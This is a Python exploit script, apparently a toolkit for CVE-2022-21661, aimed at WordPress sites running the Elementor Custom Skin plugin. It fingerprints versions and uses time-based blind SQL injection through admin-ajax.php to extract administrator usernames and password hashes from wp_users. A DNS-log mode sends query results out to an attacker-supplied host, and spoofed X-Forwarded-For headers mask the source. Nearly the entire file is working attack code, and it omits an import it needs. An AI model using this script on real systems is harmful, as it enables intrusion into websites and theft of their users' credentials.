import string
import random
import argparse
import requests
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = None
# proxies = { "http": "socks5://127.0.0.1:8080", "https": "socks5://127.0.0.1:8080" }

HELPER_MESSAGE = f"""Example:
python {__file__} --url http://127.0.0.1/ --method getinfo
python {__file__} --url http://127.0.0.1/ --method getuser
python {__file__} --url http://127.0.0.1/ --method dnslog --target example.com --payload select version()
"""

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36"

HEADERS = {"User-Agent": USER_AGENT, "X-Forwarded-For": "127.0.0.2"}

#字典，按ascii码升序排列
Dic = "$" + string.digits + string.ascii_uppercase + string.ascii_lowercase  # Wordpress数据表可能用到的字符

# SQL时间盲注的延时阈值，根据设备环境调整
time_threshold = 2.5

def gen_fake_ip():
    chars = string.digits
    arr = []
    for _ in range(4):
        arr.append("".join([random.choice(chars) for _ in range(3)]))
    return ".".join(arr)


def get_random_name():
    chars = string.ascii_lowercase
    return "".join([random.choice(chars) for _ in range(5)])


def get_random_ua():
    # return ua.random
    return USER_AGENT


def gen_headers():
    ua = get_random_ua()
    fakeIP = gen_fake_ip()
    headers = {"User-Agent": ua, "X-Forwarded-For": fakeIP}
    return headers


def detect_plugin(url):
    url_plugin = url + "/wp-content/plugins/ele-custom-skin/"
    headers = gen_headers()
    req = requests.get(url_plugin, headers=headers, proxies=proxies, verify=False)
    result = re.search(r"<title>.+</title>", req.text)
    if "ele-custom-skin" in result.group():  # 检查相关字段是否存在于插件目录
        print("[+] Elementor Custom Skin Detected!")
    else:
        print("[-] Elementor Custom Skin Not Found")


def get_info(url):
    """
    获取wordpress版本信息和elementor插件信息
    """
    url_info1 = url
    headers = gen_headers()
    req = requests.get(url_info1, headers=headers, proxies=proxies, verify=False)
    result = re.search(r"WordPress \d(\.\d)*", req.text)
    if len(result.group()) != 0:
        print(result.group())
        detect_plugin(url)
    elif len(re.search(r"\?ver=\d(\.\d)*", req.text)) != 0:
        result = re.search(r"\?ver=\d(\.\d)*", req.text)
        result = "[+] WordPress ".join(result.group().strip("\?ver="))
        print(result)
        detect_plugin(url)
    else:
        url_info2 = url + "/feed"
        req = requests.get(url_info2, headers=headers, proxies=proxies, verify=False)
        result = re.search(r"\?v=\d(\.\d)*", req.text)
        if len(result) != 0:
            result = "WordPress ".join(result.group().strip("\?v="))
            print(result)
            detect_plugin(url)
        else:
            print("[-] WordPress Version Not Found!")

def payload_format(current_len,payload,cracking_param):
    # 返回注入的字符串，其中sleep参数可能会因为阈值不同而需要修改
    return  {
                "query": '{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) or if(left((select binary '+cracking_param+' from wordpress.wp_users),'
                + current_len
                + ')>=\''
                + payload
                + '\',sleep(0.5),1)#"]}}}',
                "ecs_ajax_settings": '{"post_id":"0","current_page":"0","widget_id":"0","theme_id":"0","max_num_pages":"2"}',
            }

def get_userlogin(url,cracking_param):

    headers = gen_headers()
    # 定义user_login/pass
    len_login = 0
    user_login = ""
    print(f"Start cracking the {cracking_param}:")
    
    while 1:
        len_login += 1
        left = 0
        right = len(Dic)
        # 判断是否到达字符串末尾
        is_last = False
        while (left<=right):
            mid = ((left + right)//2)
            # 如果是特殊符号则加上双反斜杠
            if Dic[mid] == '$':
                concat = "\\" + Dic[mid]
            else:
                concat = Dic[mid]
            # 获取注入payload
            data = payload_format(str(len_login),user_login+concat,cracking_param)
            time1 = time.time()
            res = requests.post(url, headers=headers, data=data)
            time2 = time.time()
            print(Dic[mid]+' '+str(time2 - time1)+' '+str(left)+' '+str(right))
            # 如果时间间隔大于阈值则说明该字段在mid的右边
            if time2 - time1 > time_threshold:
                # 如果left和right相差1的情况下可以认定找到了匹配的字符，打印并退出
                if (left<right-1):
                    left = mid
                else:
                    user_login += Dic[left]
                    print(user_login)
                    break
            else:
                if (left<right-1):
                    right = mid 
                else:
                    # 如果left和right相差1的情况下仍旧小于$的ascii码，即空字符串，即可判断到达了末尾
                    len_login -= 1
                    is_last = True
                    break
        if (is_last):
            break
    if (len_login!=0):
        print(f"[+] {cracking_param}: {user_login}")
    else:
        print(f"[-] The {cracking_param} may not be injectable.")


def get_user(url):
    
    headers = gen_headers()
    '''
    # 打印一次SQL查询大概的时间，便于设定阈值
    data = {
        "query": '{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) or if(left((select user_pass from wordpress.wp_users),1)=\'\\$\',sleep(2),1)#"]}}}',
        "ecs_ajax_settings":  '{"post_id":"0","current_page":"0","widget_id":"0","theme_id":"0","max_num_pages":"2"}',
    }
    time1 = time.time()
    res = requests.post(url, headers=headers, data=data)
    time2 = time.time()
    print(time2-time1)
    '''
    url = url + "/wp-admin/admin-ajax.php?action=ecsload"
    get_userlogin(url,'user_login')
    get_userlogin(url,'user_pass')

def dnslog(url,target,payload):
    headers = gen_headers()
    url = url + "/wp-admin/admin-ajax.php?action=ecsload"
    tmp = "select load_file(concat('\\\\\\\\\'," + payload + ",'." + target + "\\\\abc'))"
    data = {
        "query": '{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) or if(1=1,' + tmp + ',1)#"]}}}',
        "ecs_ajax_settings":  '{"post_id":"0","current_page":"0","widget_id":"0","theme_id":"0","max_num_pages":"2"}',
    }
    res = requests.post(url, headers=headers, data=data)
    print('Dnslog sent to target.')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="CVE-2022-21661 exp",
        description="CVE-2022-21661 exploit toolkit, ",
        epilog=HELPER_MESSAGE,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--url",
        metavar="http://example.com/",
        type=str,
        nargs="?",
        help="the target url",
        dest="url",
        required=True,
    )
    parser.add_argument(
        "--method",
        dest="method",
        metavar="getinfo",
        type=str,
        nargs="?",
        help="the exploit method: getinfo,getuser,dnslog",
        required=True,
    )
    parser.add_argument(
        "--target",
        metavar="example.com",
        type=str,
        nargs="?",
        help="the dnslog url",
        dest="target",
    )
    parser.add_argument(
        "--payload",
        metavar="select version()",
        type=str,
        nargs="?",
        help="the executed sql payload",
        dest="payload",
    )
    args = parser.parse_args()
    url = args.url.strip("/")
    method = args.method
    if method not in ["getinfo", "getuser", "dnslog"]:
        parser.print_help()
        exit()
    try:
        if method == "getinfo":
            get_info(url)

        elif method == "getuser":
            get_user(url)
        elif method == "dnslog":
            target = args.target
            payload = args.payload
            dnslog(url,target,payload)
        else:
            parser.print_help()
            exit()
    except Exception as e:
        print("Something error: {}, maybe not vulnerable".format(e))